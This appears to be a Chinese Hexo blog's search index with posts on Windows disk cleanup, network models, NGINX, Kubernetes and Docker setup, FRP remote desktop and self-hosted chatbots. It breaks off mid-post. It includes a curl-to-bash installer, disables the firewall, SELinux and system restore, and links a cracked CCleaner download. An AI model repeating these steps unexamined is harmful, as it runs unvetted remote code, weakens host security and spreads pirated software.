[{"title":"C盘战士拯救者","url":"/2024/04/27/windowscleaner/","content":"\n身边还是有不少朋友都是典型的C盘战士的，经常遇到爆红的情况，所以就盘点一些垃圾清理的方法送给她们吧。\n\n### 配置存储感知\n\n<kbd>Win</kbd> + <kbd>Q</kbd>搜索“存储感知”，将存储感知的开关打开，然后可以点击下方的“配置存储感知或立即运行”来进行第一遍的存储清理。   \n\n<!--more-->\n\n可以将运行存储感知调整为每天，那Windows就会每天自动进行存储清理，还可以将临时文件的部分按照需要进行设置，如下图，我个人是更倾向于14天的（半个月没用到的文件估计没多重要，就删除）。\n\n> 当然如果14天也会误删重要文件，那就只能养成一个良好的存储文件的习惯，不要直接将文件丢在C盘。\n\n<img src=\"./windowscleaner/1.png\" alt=\"存储感知\" style=\"zoom:70%;\" />\n\n### 系统存储清理\n\n如下图所示，C盘分门别类地列出了很多文件选项。从“临时文件”选项包括“临时文件”这些文件选项都是可以清理的，都不会影响系统运行。唯一需要自己判断的就是“桌面”“文档”“图片”“视频”这些文件选项可能会包含之前盲目点击“下一步”而存在的重要文件，所以需要自己判断，删的时候也要擦亮双眼。\n\n<img src=\"./windowscleaner/2.png\" alt=\"系统清理\" style=\"zoom:50%;\" />\n\n#### 应用和功能\n\n这里面能做的就是卸载一些一辈子用不上的应用，可以起到的作用其实微乎其微，但是对自己没用的东西其实真的没必要留着对吧。\n\n#### 清理休眠文件\n\n系统和保留里面“系统文件”“保留的存储”就别想着动了。  \n\n如我下图给的样例，有些人可能会多一个“休眠文件”选项，而且使用的空间还很多。休眠文件保证计算机在关机的状态下，保留电脑运行的任务，比如浏览器打开的页面、音乐播放器的进度等。有利就有弊，这些需要计算机记忆的东西因为要关机不可以保存到内存，就只能保存到硬盘了，所以休眠文件会占用很多空间。\n\n<img src=\"./windowscleaner/3.png\" alt=\"清理休眠文件\" style=\"zoom:70%;\" />\n\n清理休眠文件的逻辑就是先关闭休眠功能，将之前的休眠文件删除，然后再打开休眠功能，休眠文件是随着休眠次数增多而增加的，所以可以在需要的时候就重新生成一下。\n\n关闭休眠功能，<kbd>Win</kbd>+<kbd>Q</kbd>搜索“cmd”，以管理员身份打开。输入下面的命令。\n\n```bash\npowercfg -h off\n```\n\n当然如果后面需要休眠功能，可以再次打开，只需要将`off`改为`on`即可。\n\n```bash\npowercfg -h on\n```\n\n### 删除临时文件\n\n<kbd>Win</kbd>+<kbd>R</kbd>输入`%temp%`，然后点击确定，即可进入临时文件目录。这里面的文件都可以清除，但是需要注意的是，如果文件被其他程序占用，就无法删除。所以清理前要尽量关掉开启的应用。如果删除时出现文件被占用什么的情况，也不用非得在意，删不了就删不了吧，因为这个方法能起到的效果微乎其微。\n\n### 配置系统还原点\n\n<kbd>Win</kbd>+<kbd>Q</kbd>输入`创建还原点`，然后点击确定，即可进入。  \n点击配置，将系统保护禁用并且将最大使用量拉到最低，修改完成后点击确定即可。部分电脑可能会提示需要重启，可以重启一下。\n\n<img src=\"./windowscleaner/4.png\" alt=\"创建还原点\" style=\"zoom:70%;\" />\n\n### 专业软件清理\n\n我一直在使用的是CCleaner，可以说是装机必备的软件之一，[官网下载地址，点击跳转](https://www.ccleaner.com/zh-cn/ccleaner/download)  \n\n官网是区别普通版和专业版的，当然我会提供[平民开心版，点击跳转](https://pan.baidu.com/s/1m8zQr5KqpmVylnYDy5vI3g?pwd=ghox) \n\n他可以清理垃圾，清理注册表，更新驱动，卸载软件等，非常实用。\n\n<img src=\"./windowscleaner/5.png\" alt=\"CCleaner\" style=\"zoom:70%;\" />","tags":["Windows"],"categories":["小玩意儿"]},{"title":"OSI模型与TCP/IP模型","url":"/2024/04/10/OSI-TCP-IP-model/","content":"\n### OSI七层模型\n\nOSI七层模型分别是：应用层、表示层、会话层、 运输层、网络层、数据链路层、物理层。\n\n> 有的将运输层讲为传输层，其实大家表达的意思都一样。\n\n<!-- more -->\n\n#### 应用层\n\n应用层是直接面向用户的，提供UI页面的。\n\n#### 表示层\n\n表示层负责数据的加密与解密，数据的格式转换、数据的压缩与解压。\n\n#### 会话层\n\n会话层负责管理会话。建立连接，维护连接，控制连接的建立与终止。包括何时开始会话，何时交换数据，数据发送方式（轮流发送、同时发送）、会话中断如何恢复、会话如何结束。\n\n#### 运输层\n\n段是运输层的数据传输单位，运输层是在为正在通讯的两台主机的应用进程服务的，并且提供的是可靠的数据传输服务。特别留意运输层是**端到端的通讯方式**，运输层的功能可以概括为“三控制一寻址”：\n\n- 差错控制：检测传输过程中数据的错误，并纠正错误。\n- 流量控制：为了防止发送方将数据过快的发送，而接收方不能及时接收，从而导致数据丢失的现象。\n- 连接控制：为了提供可靠的**端到端**通信，在传输数据时建立连接，在数据传输完毕关闭连接。\n- 应用进程寻址：一台主机上可能会有多个应用进程，运输层要通过某种编址方法，能区分每个应用进程，将数据传输给正确的应用进程。\n\n#### 网络层\n\n网络层的基本传输单位是分组。在数据的发送方和接收方有可能隔着很多不同的网络，而网络层的主要的任务是为分组择路，选择一条合适的路径，使数据能够从发送方到达接收方。特别留意运输层是**点到点的通讯方式**。\n\n#### 数据链路层\n\n数据链路层的基本传输单位是帧。数据链路层是网络层和物理层的桥梁，在同一物理网络中，两个节点（主机与交换机）之间传输帧，数据链路层也涉及到一个寻址的问题，而在数据链路层是通过MAC地址的方式进行寻址的。数据链路层也有流量控制、差错控制、访问控制的功能。\n\n#### 物理层\n\n物理层的基本传输单位是比特。物理层更贴近硬件，比如网线。物理层的主要任务是将0,1比特流从物理链路的一端发送到另一端。\n\n### 图片对比\n\n![图片对比](./OSI-TCP-IP-model/1.png)\n\n### TCP/IP模型\n\nTCP/IP模型是OSI模型之后新提出的模型，一共四层：应用层、运输层、互联网层、网络接口层。\n\n#### 应用层\n\nTCP/IP模型与OSI模型的应用层功能基本一致，囊括应用层的应用协议，如HTTP、FTP、SMTP、POP3等。TCP/IP模型没有包含OSI中的表示层和会话层，在实际的联网实践中证明这两个层对于多数的应用程序没有多大的用处。\n\n#### 运输层\n\nTCP/IP模型的运输层也同样提供的是**端到端**的通讯。在TCP/IP的体系中，运输层提供两个非常重要的协议，分别是TCP和UDP。\n\n- TCP：TCP是面向连接的，TCP协议在传输数据之前，会先建立连接，然后才能传输数据；在传输数据时，会进行差错控制，保证数据的可靠性，同时会进行流量控制，保证数据的传输速度。\n- UDP：UDP是面向无连接的，UDP协议不能保证数据的可靠性，但是UDP协议效率比较高，传输的速度比较快，适合对数据安全性不高对速度高的服务，比如音频和视频。\n\n#### 互联网层\n\n互联网层相当于OSI模型的网络层，同样是为运输层交给它的数据择路，将数据发送给接收方。主要的协议是IP协议，而IP协议是无连接的数据报服务，也就是说IP协议其实是不可靠的服务，但是IP协议不负责去解决这些问题，而是交给TCP去解决。\n\n#### 网络接口层\n\n网络接口层相当于OSI模型的数据链路层和物理层，主机使用某种协议与具体的网络连接，能够传递IP数据报。\n\n### 讲在后面的话\n\n#### TCP/IP到底几层\n\nTCP/IP是事实标准，分4层。OSI模型是国际标准，分7层。讲课的时候，一般把他们综合起来讲，就说是5层。他把网络接口层分开为数据链路层和物理层了。\n\nOSI的七层协议体系结构的概念清楚，理论也比较完整，但它既复杂又不实用，TCP/IP体系结构则不同，它现在已经得到了非常广泛的应用，TCP/IP是一个四层的体系结构，它包含应用层、运输层、互联网层和网络接口层，不过从实质来讲，TCP/IP只有最上面的三层，因为最下面的网络接口层基本上和一般的通信链路的功能上没有多大差别，对于计算机网络来说，这一层并没有什么特别新的具体的内容，因此在学习计算机网络原理是往往采用折中的办法，即综合OSI和TCP/IP的优点，采用一种只有五层协议的体系结构。","tags":["面试","网络基础"],"categories":["理论知识"]},{"title":"NGINX配置的那些事","url":"/2024/04/02/nginx-proxy/","content":"\n知道的越多，不知道的越多，NGINX的功能远比我所能理解的多太多了。  \n山高万仞，只登一步。披荆斩棘，行则将至。\n\n<!-- more -->\n\n### NGINX端口重定向（80 to 443）\n\n在生产环境中，一般不会使用http协议进行Web访问，都是使用https加密的方式进行Web访问，http和https各自监听的端口都不一样，那多余的80端口，该何去何从？一个比较合适的做法是端口重定向，使用NGINX的重写功能，将访问80端口的请求自动转发给443端口，下面是一个例子：\n\n```bash 折叠代码\nserver {\n    # HTTPS的默认访问端口443。如果未在此处配置HTTPS的默认访问端口，可能会造成Nginx无法启动。\n    listen 443 ssl;\n     \n    # 填写证书绑定的域名\n    server_name itellyou.cf;\n \n    # 关于配置SSL证书的部分，保证证书路径正确，其他保持不变即可\n    ssl_certificate /opt/ssl/itellyou.cf.pem;\n    ssl_certificate_key /opt/ssl/itellyou.cf.key;\n    ssl_session_cache shared:SSL:1m;\n    ssl_session_timeout 5m;\n    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;\n    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;\n    ssl_prefer_server_ciphers on;\n\n    location / {\n        root /usr/share/nginx/html;\n        index index.php index.html index.htm;\n    }\n}\n\nserver {\n    listen 80;\n    #填写证书绑定的域名\n    server_name itellyou.cf;\n    #将所有HTTP请求通过rewrite指令重定向到HTTPS。\n    rewrite ^(.*)$ https://$host$1;\n    location / {\n        index index.php index.html index.htm;\n    }\n}\n```\n\n### NGINX反向代理\n\n#### 反向代理不加密站点\n\n```bash 折叠代码\nserver {\n    # 配置http要监听80端口\n    listen 80;\n    # 确保DNS厂商已经正确解析域名\n    server_name ai.itellyou.cf;\n\n    # 填写正确的后端代理地址\n    location / {\n        proxy_pass http://itellyou.cf:30080;\n    }\n}\n```\n\n#### 反向代理SSL加密站点\n\n```bash 折叠代码\nserver {\n    # 配置https要监听443端口\n    listen 443 ssl;\n    # 确保DNS厂商已经正确解析域名\n    server_name ai.itellyou.cf;\n \n    # 关于配置SSL证书的部分，保证证书路径正确，其他保持不变即可\n    ssl_certificate /opt/ssl/ai.itellyou.cf.pem;\n    ssl_certificate_key /opt/ssl/ai.itellyou.cf.key;\n    ssl_session_cache shared:SSL:1m;\n    ssl_session_timeout 5m;\n    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;\n    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;\n    ssl_prefer_server_ciphers on;\n\n    # 填写正确的后端代理地址\n    location / {\n        proxy_pass http://itellyou.cf:30080;\n    }\n}\n```","tags":["Linux","NGINX"],"categories":["技术"]},{"title":"K8S集群环境搭建","url":"/2024/03/25/install-k8s/","content":"\n简单玩了一下K8S，安装也太费劲了，一大堆坑，浅浅记录一下吧。\n\n### 安装环境\n\n1. CentOS Stream release 8\n<!--more-->\n2. K8S v1.23.6\n3. Docker version 26.0.0, build 2ae903e\n\n|主机名|IP|CPU|内存|\n|:---:|:---:|:---:|:---:|\n|k8s-mst|192.168.229.130|4|8G|\n|k8s-nd1|192.168.229.131|4|4G|\n|k8s-nd2|192.168.229.132|4|4G|\n\n### 安装步骤\n\n> 下面的步骤2.1-2.8，是需要在三台虚拟机上都执行的；2.9-2.10只在master主机执行即可；2.11在所有节点主机执行即可；2.12-2.14在master主机执行即可。\n\n#### 基础操作\n\n下面的操作代表的含义依次是：关闭防火墙、关闭selinux、关闭swap分区\n\n```bash\nsystemctl stop firewalld && systemctl disable firewalld && iptables -F\nsed -i 's/enforcing/disabled/' /etc/selinux/config && setenforce 0\nswapoff -a\nsed -ri 's/.*swap.*/#&/' /etc/fstab\n```\n\n#### 分别修改各主机的主机名\n\n```bash\nhostnamectl set-hostname k8s-mst\nhostnamectl set-hostname k8s-nd1\nhostnamectl set-hostname k8s-nd2\n```\n\n#### 修改各主机的hosts文件\n\n```bash\n192.168.229.130 k8s-mst\n192.168.229.131 k8s-nd1\n192.168.229.132 k8s-nd2\n```\n\n利用 `scp` 命令将 `/etc/hosts` 文件复制到其他主机\n\n```bash\nscp /etc/hosts k8s-nd1:/etc/hosts\n```\n\n#### 修改内核参数\n\n```bash\ncat > /etc/sysctl.d/k8s.conf << EOF\nnet.bridge.bridge-nf-call-ip6tables = 1\nnet.bridge.bridge-nf-call-iptables = 1\nnet.ipv4.ip_forward = 1\nEOF\n\nsysctl --system\n```\n\n#### [安装Docker](https://nustarain.gitee.io/2023/10/30/DockerInit)\n\n```bash\ncurl -fsSL https://get.docker.com | bash -s docker\n```\n\n如果要适配K8S，需要对Docker的daemon.json文件进行升级，配置如下：\n\n```bash\ncat > /etc/docker/daemon.json << EOF\n{\n\"registry-mirrors\": [\"https://gqs7xcfd.mirror.aliyuncs.com\",\"https://hub-mirror.c.163.com\"],\n\"exec-opts\": [\"native.cgroupdriver=systemd\"],\n\"log-driver\": \"json-file\",\n\"log-opts\": {\n\"max-size\": \"100m\"\n},\n\"storage-driver\": \"overlay2\"\n}\nEOF\n```\n\n启动Docker服务\n\n```bash\nsystemctl daemon-reload && systemctl enable --now docker\n```\n\n#### 配置K8S的yum源\n\n需要自己添加一个用于下载K8S的yum源，这里我使用的是阿里云的源。\n\n```bash\ncat > /etc/yum.repos.d/kubernetes.repo << EOF\n[kubernetes]\nname=Kubernetes\nbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/\nenabled=1\ngpgcheck=1\nrepo_gpgcheck=1\ngpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\nEOF\n```\n\n#### 安装K8S\n\n1.24.X 版本都不再兼容Docker，所以还是使用1.23.X版本。\n\n```bash\nyum install -y kubelet-1.23.6 kubeadm-1.23.6 kubectl-1.23.6\n```\n\n#### 启动K8S服务\n\n```bash\nsystemctl enable --now kubelet\n```\n\n#### 初始化K8S集群\n\n```bash\nkubeadm init \\\n--kubernetes-version 1.23.6 \\\n--apiserver-advertise-address=192.168.229.130 \\\n--service-cidr=10.96.0.0/12 \\\n--pod-network-cidr=10.244.0.0/16 \\\n--image-repository registry.aliyuncs.com/google_containers\n```\n\n- kubernetes-version 集群版本\n- apiserver-advertise-address API服务器通告地址，即k8s主节点。\n- service-cidr 服务网段\n- pod-network-cidr Pod网段\n- image-repository 镜像仓库\n\n这一步会产生很多奇奇怪怪的问题，但是如果是按照我这个步骤和版本安装下来的，估计是不会出问题的。安装完事之后如果看到如下输出，说明安装成功了。\n\n```bash\nkubeadm join 192.168.229.130:6443 --token iks8xq.pqnnn0uvotgtloyj \\\n--discovery-token-ca-cert-hash\nsha256:674a06791e7637efccdaf9874346d0815a6f864a29670acccaa2aa1c998e2ef4 \n```\n\n#### 配置kubectl\n\n不要清屏，按照上面的提示，依次执行他给出来的命令。\n\n```bash\nmkdir -p $HOME/.kube\nsudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\nsudo chown $(id -u):$(id -g) $HOME/.kube/config\n```\n\n#### 节点加入集群\n\n如果还留着提示，直接复制他给出的`kubeadm join`命令，然后执行即可。如果丢了，需要手动查看一下两个参数，`--token`和`--discovery-token-ca-cert-hash`。\n\ntoken可以使用如下命令查看，比如是“xxxxxx”。\n\n```bash\nkubeadm token list\n```\n\ndiscovery-token-ca-cert-hash可以使用如下命令查看，比如是“yyyyyy”。\n\n```bash\nopenssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2> /dev/null | openssl dgst -sha256 -hex | sed 's/^.* //'\n```\n\n然后给他们组合到一块\n\n```bash\nkubeadm join 192.168.229.130:6443 --token xxxxxx \\\n--discovery-token-ca-cert-hash sha256:yyyyyy\n```\n\n#### 安装网络插件CNI\n\n```bash\nmkdir /opt/k8s && cd /opt/k8s\ncurl https://calico-v3-25.netlify.app/archive/v3.25/manifests/calico.yaml -O\n```\n\n这个时我们就下载了一个文件名字叫：calico.yaml，但是这个文件需要改一下cidr。这里的cidr就是我们初始化时候`--pod-network-cidr`字段的cidr。\n\nvim calico.yaml，搜索“CALICO_IPV4POOL_CIDR”。\n\n![修改配置文件](./install-k8s/1.png)\n\n#### 下载calico.yaml文件里描述的镜像\n\ncalico.yaml 里面用的都是docker.io的镜像，你可以先使用`grep image calico.yaml`命令查看一下。然后我们做一下修改，执行以下命令：\n\n```bash\nsed -i 's#docker.io/##g' calico.yaml \n```\n\n完事后你也可以再验证一下：`grep image calico.yaml`。然后kubectl apply一下：\n\n```bash\nkubectl apply -f calico.yaml\n```\n\n这个时候kebe就会自己去下载镜像了，不会前台显示，下载速度取决于你的网速。但是你可以通过`kubectl get pods -n kube-system`命令查看一下，如果镜像下载完了，就会看到如下输出，所有容器都是运行起来的：\n\n![下载验证](./install-k8s/2.png)\n\n这样就完成了K8S的安装。\n\n#### 验证\n\n我们可以去运行一个nginx实例，去看看到底还有没有什么问题。\n\n```bash\nkubectl create deployment nginx --image=nginx\nkubectl expose deployment nginx --port=80 --type=NodePort\nkubectl get pod,svc\n```\n\n![验证kube](./install-k8s/3.png)\n\n在宿主机上访问节点IP:port。\n\n![验证kube](./install-k8s/4.png)\n\n### 其他高级配置\n\n#### 配置在其他节点的控制\n\n这个就是说在任何节点上都可以对k8s的API-server进行访问，对节点进行管理。换言之，你不配置这一步，你只能在主节点进行`kubectl get nodes`命令，其他节点执行不了。\n\n```bash\nscp /etc/kubernetes/admin.conf root@k8s-nd1:/etc/kubernetes\nscp /etc/kubernetes/admin.conf root@k8s-nd2:/etc/kubernetes\n```\n\n拷贝过去之后，分别在两个节点上执行如下命令：\n\n```bash\necho \"export KUBECONFIG=/etc/kubernetes/admin.conf\" >> ~/.bash_profile\nsource ~/.bash_profile\nkubectl get node\n```\n\n如果显示有效内容，说明配置成功了。\n\n#### 配置kubectl命令自动补全\n\n初始配置K8S是不能进行命令补全的，使用起来太麻烦，尤其是对于我这个<kbd>Tab</kbd>键重度使用者，实在太不爽。下面是配置K8S命令补全的方法：\n\n> 一般在master节点执行就可以满足需求，但是如果有需求，也可以在worker节点上配置。\n\n```bash\nyum install -y bash-completion\nsource /usr/share/bash-completion/bash_completion\nsource <(kubectl completion bash)\necho \"source <(kubectl completion bash)\" >> ~/.bashrc\n```","tags":["Linux","K8S"]},{"title":"Docker报错 unable to configure the Docker daemon with file /etc/docker/daemon.json","url":"/2024/03/04/DockerModifyConf/","content":"\n莫名遇到一个非常奇怪的问题，Docker报错 unable to configure the Docker daemon with file /etc/docker/daemon.json:EOF，明明什么都没做。\n\n<!-- more -->\n\n### 解决办法\n\n上网查找原因，给出一个非常奇怪的解决方案，就是将创建的daemon.json文件的后缀改为conf，即/etc/docker/daemon.conf。然后重启Docker，问题解决。\n\n```bash\nmv /etc/docker/daemon.json /etc/docker/daemon.conf\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```\n\n在之前的[安装Docker](https://nustarain.gitee.io/2023/10/30/DockerInit/)的博客中，也相应的进行了调整。","tags":["Docker"],"categories":["技术"]},{"title":"FRP实现 Windows 远程桌面","url":"/2024/01/14/frp/","content":"\n最近入手了一台VPS，针对VPS进行了一些功能探索。所以此教程是需要基于一台VPS的。类似于向日葵和 To Desk 的远程桌面，只不过 FRP 实现的远程桌面不需要你再去记住远程软件提供的控制码。\n\n<!-- more -->\n\n### 啰嗦几句\n\nFRP 的安装分为服务器端和客户端。服务器端需要在 VPS 上安装，客户端需要在本地安装（也就是需要被远程连接的机器）。\n\n此项目也是Github上的项目，[项目链接 https://github.com/fatedier/frp](https://github.com/fatedier/frp)\n\n### 服务器端安装 FRP\n\n直接使用下面的命令\n\n```bash\nwget https://github.com/fatedier/frp/releases/download/v0.15.1/frp_0.15.1_linux_amd64.tar.gz\n```\n下载好后压缩包后解压，会得到以下几个文件\n\n![文件展示](./frp/1.png)\n\n* frpc 是客户端运行的可执行文件，VPS这里不需要理它。\n* frpc.toml 是客户端的配置文件，VPS这里不需要理它。\n* frps 是服务端运行的可执行文件，VPS要用\n* frps.toml 是服务端的配置文件，VPS要用。\n\n### 修改服务端配置文件frps.toml\n\n```toml\nbindPort = 7000\n```\n\n![服务端配置文件](./frp/4.png)]\n\n修改后运行如下命令启动服务：\n\n```bash\nfrps -c ./frps.toml\n```\n\n运行后，会有输出内容，这是问题就出现了，不能<kbd>Ctrl</kbd> + <kbd>C</kbd>停止掉，这就造成当前运行服务后不能进行其他操作了。所以需要把服务做成后台服务，这样就可以在前台进行其他操作了。\n\n如果访问Github有困难的话，可以去百度网盘下载，我使用的是0.53.0版本，提供的也是0.53.0版本。[**服务器端百度网盘链接，点击跳转，**](https://pan.baidu.com/s/1eTxV0C_ApwfWivirMB6zIg?pwd=wzns) 提取码：wzns\n\n### 使用 systemctl 管理 FRP 服务\n\n首先放一个官方链接，[**点击跳转。**](https://gofrp.org/zh-cn/docs/setup/systemd/)\n\n1. 安装 systemd\n\n如果您的 Linux 服务器上尚未安装 systemd，可以使用包管理器如 yum（适用于 CentOS/RHEL）或 apt（适用于 Debian/Ubuntu）来安装它：\n\n```bash\n# 使用 yum 安装 systemd（CentOS/RHEL）\nyum install systemd\n\n# 使用 apt 安装 systemd（Debian/Ubuntu）\napt install systemd\n```\n\n2.创建 frps.service 文件\n\n使用文本编辑器 (如 vim) 在 /etc/systemd/system 目录下创建一个 frps.service 文件，用于配置 frps 服务。\n\n```bash\nsudo vim /etc/systemd/system/frps.service\n```\n\n3. 写入内容\n\n```bash\n[Unit]\n# 服务名称，可自定义\nDescription = frp server\nAfter = network.target syslog.target\nWants = network.target\n\n[Service]\nType = simple\n# 启动frps的命令，需修改为您的frps的安装路径\nExecStart = /path/to/frps -c /path/to/frps.toml\n\n[Install]\nWantedBy = multi-user.target\n```\n\n4. 然后就可以像管理其他服务一样，使用systemctl命令来管理frps了。\n\n```bash\n# 启动frp\nsudo systemctl start frps\n# 停止frp\nsudo systemctl stop frps\n# 重启frp\nsudo systemctl restart frps\n# 查看frp状态\nsudo systemctl status frps\n```\n\n### 客户端（Windows）安装FRP\n\n[0.53.0官方Windows下载链接，点击下载](https://github.com/fatedier/frp/releases/download/v0.53.0/frp_0.53.0_windows_amd64.zip)   \n同样的，访问Github有困难的话，可以使用百度网盘下载，[**客户端百度网盘链接，点击跳转**](https://pan.baidu.com/s/11-wDw4l_augPWeAf9OcTGA?pwd=kstm) 提取码：kstm\n\n### 客户端配置文件修改\n\n下载解压后，除了你们没有如图所示的第一个文件外，其他应该都一样。\n\n![客户端文件展示](./frp/2.png)\n\n```toml\nserverAddr = \"123.56.10.1\"  # 服务器地址，填写自己真实的VPS地址\nserverPort = 7000           # 服务器端口，与服务端配置的端口一致\n\n[[proxies]]\nname = \"HP-desktop\"         # 备注，随便写\ntype = \"tcp\"                # 类型，不要变\nlocalIP = \"127.0.0.1\"       # 不要变\nlocalPort = 3389            # 本地端口，不要变\nremotePort = 10086          # 远程端口，自己设，比如设置为10086，以后访问这台Windows就是输入123.56.10.1:10086。\n```\n\n使用起来是和服务器端一样的，只不过这次需要运行客户端的文件。在当前目录鼠标右击打开CMD，然后如图所示运行（一定要看清楚运行的是 **frpc** 的文件）。\n\n![客户端文件展示](./frp/3.png)\n\n### 设置Windows无窗口启动\n\n这也就是为什么我会多出来一个.vbs文件。话不多说，放码出去。\n\n```vbs\nSet WShell = CreateObject(\"WScript.Shell\")\ncommand = \"frpc.exe\"\narguments = \"-c frpc.toml\"\nfullCommand = command & \" \" & arguments\nWShell.Run fullCommand, 0, False\nSet WShell = Nothing\n```\n\n想启动服务直接双击这个.vbs文件即可，如果想达到开机自启动，可以将这个.vbs文件放到开机计划中。\n\n1. 首先创建好快捷方式。\n2. <kbd>Win</kbd>+<kbd>R</kbd>输入`shell:startup`，直接回车。\n3. 将快捷方式放入这个文件夹中，大功告成。\n\n### 测试\n\n<kbd>Win</kbd>+<kbd>Q</kbd>搜索“远程桌面连接”，输入IP以及端口号，如果没毛病的话，就是如下的效果。如果有什么问题，可以评论区留言。\n\n![客户端文件展示](./frp/5.png)\n\n最后输入被控电脑的用户名和密码进行登录。\n\n---\n---\n\n### 易错点\n\n1. 以上面的教程为例，VPS 是需要打开 7000 端口和 10086 端口的，放行这两个端口，否则无法连接。\n\n2. Windows 家庭版无法使用远程桌面，要么重新安装 Windows 专业版，要么使用专业版激活码重新激活。","tags":["Linux","Windows"],"categories":["小玩意儿"]},{"title":"在本地搭建自己的chatGPT","url":"/2023/12/24/pandora-next/","content":"\n### 背景 \n\n由于 [**pandora**](https://github.com/cloud804d/mirrors-pengzhile-pandora) 项目被攻击加之开发者的 github 账号频繁被封，作者重新开了新账号进行项目的开发，于是有了功能更强大的 [**pandora-next**](https://github.com/pandora-next/deploy?tab=readme-ov-file)\n\n### 准备工作\n\n有一个 github 的账号，最好是注册了一年以上的。\n\n<!-- more -->\n\n* [**注册github账号**](https://github.com/)\n\n有 docker 环境，最好有 docker-compose 环境。   \n* [**安装docker环境教程**](https://nustarain.gitee.io/2023/10/30/DockerInit/?highlight=docker)\n* [**安装docker-compose环境教程**](https://nustarain.gitee.io/2023/11/03/install-docker-compose/?highlight=docker)\n\n接下来就是教程时间。\n\n### 配置步骤\n\n1. 首先克隆项目的仓库，墙外用第一个链接，墙内用第二个链接。\n\n```bash\ngit clone https://github.com/pandora-next/deploy.git\ngit clone https://gitclone.com/github.com/pandora-next/deploy.git\n```\n\n2. 执行以下操作。\n\n```bash\nmv deploy/ pandora_next\ncd pandora_next/\nrm -rf best.php README.md \n```\n\n3. 获取 license_id \n\n在这里获取：[https://dash.pandoranext.com](https://dash.pandoranext.com)   \n然后会要求你登录 github 的账号，正常登录，然后会出现以下页面。\n\n![pandora](./pandora-next/1.png)\n\n* github 账号注册时间主要是影响每天的对话数量。\n* 复制下面的 license_id，待会儿会用到。\n* 如果是在 VPS 上搭建的话，可以执行下面的随便一条命令来下载 license.jwt 文件，下载后不需要更改，放在 pandora_next 目录下就可以。\n\n4. 修改 config.json 文件\n\n```bash\ncd data/ && vim config.json\n```\n\n* \"bind\": \"0.0.0.0:8181\" 默认使用的8181端口，可以在这里进行修改。\n* 修改 license_id 字段，将之前复制的 license_id 复制到这里。\n* site_password 字段是进入 Web 时要填的密码。\n* setup_password 字段是管理配置文件的密码，使用方法是在浏览器搜索框输入`127.0.0.1:8181/setup`\n\n其他字段的含义可以查看[**官方的说明文档**](https://docs.pandoranext.com/zh-CN/configuration/config)\n\n5. 启动容器\n\n```bash\ncd .. && docker-compose up -d\n```\n\n6. 大功告成，浏览器访问即可，下期介绍 [**pandora-next 关于 token.json 的进阶操作**]()。","tags":["AI"],"categories":["小玩意儿"]},{"title":"利用 Docker 搭建本地的 Gemini","url":"/2023/12/20/gemini/","content":"\n之前利用 Docker 搭建了本地了 ChatGPT，具体的搭建步骤可以查看[**利用docker搭建本地的chatGPT**](https://nustarain.gitee.io/2023/09/12/LocalchatGPT/)。\n\n这次利用 Docker 来搭建 Google 公司推出的 Gemini 聊天机器人。\n\n### 搭建步骤\n\n1. 使用 Google 账号注册 Gemini，[**Gemini官网地址**](https://deepmind.google/technologies/gemini/#introduction)。\n\n<!-- more -->\n\n2. 跳转到[**这个页面**](https://ai.google.dev/) 准备进行 API 的获取。\n\n![gemini](./gemini/1.png)\n\n3. 进入这个页面后获取 API，到此，最复杂的就完事了。\n\n![gemini](./gemini/2.png)\n\n4. 拉取镜像\n\n```bash\ndocker pull howie6879/geminiprochat:v0.1.0\n```\n\n5. 运行容器\n\n```bash\ndocker run --name geminiprochat \\\n--restart always \\\n-p 3030:3000 \\\n-itd \\\n-e GEMINI_API_KEY=xxx \\\nhowie6879/geminiprochat:v0.1.0\n```\n\nGEMINI_API_KEY=xxx 把“xxx”换成自己的 API 就 OK 了。端口的话也可以根据喜好修改。\n\n6. 打开浏览器访问，效果如下\n\n![gemini](./gemini/3.png)\n\n### 优劣对比\n\nChatGPT 本地搭建需要一段时间就重新获取一下 token 值，但是 Gemini 不需要重复获取 token 值。\n\nChatGPT 可以同时创建很多会话，但是 Gemini 只能有一个会话。\n\nChatGPT 不能联网，Gemini 是联网的，但是数据只到2023年3月。","tags":["AI"],"categories":["小玩意儿"]},{"title":"博客添加视频方法的总结","url":"/2023/12/16/blog-add-MM/","content":"\n博客添加视频目前我掌握的一共有两种办法，一种是使用 [**hexo-tag-dplayer 插件**](https://github.com/MoePlayer/hexo-tag-dplayer)，这是对于使用 Hexo 用户多出来的一个选项，但是多出来的这个选项，实际体验也不怎么样。\n\n### hexo-tag-dplayer\n\n使用 Hexo-tag-dplayer 可以使用以下代码进行添加视频：\n\n<!-- more -->\n\n```bash\n{% dplayer \n  \"url=https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085\" \n  \"screenshot\" \n  \"loop=false\" \n  \"preload=auto\"\n  \"volume=0.4\"\n  \"id=46190A32F63DFF2CF0A3BB0F3293636C\" \n  \"api=https://api.prprpr.me/dplayer/\" \n  \"addition=https://api.prprpr.me/dplayer/v3/bilibili?aid=17150441\" \n%} \n```\n\n唯一需要自己完成的就是关于视频地址的获取，我这里使用的是[酷播云](https://v.cuplayer.com/)，在国内还是比较快的。\n\n但是经过我使用发现，这个插件在网页中第一次加载时加载不出来视频，需要在进入网页后再进行一次刷新，有时候一篇文章看完了都不知道竟然还有一个视频。\n\n[**点击这里，查看效果**](https://nustarain.gitee.io/2023/09/08/tiangangfu/) 视频在最下面，看不到的话，刷新一下。\n\n具体的解决办法我并没有深究，好在发现了另一个办法。\n\n### iframe\n\n除了使用 hexo-tag-dplayer 还有 H5 中的 iframe 标签也不错。可以通过以下代码引入：\n\n```bash\n<iframe style='width: 600px;height: 338px' frameborder='no' allowfullscreen mozallowfullscreen webkitallowfullscreen 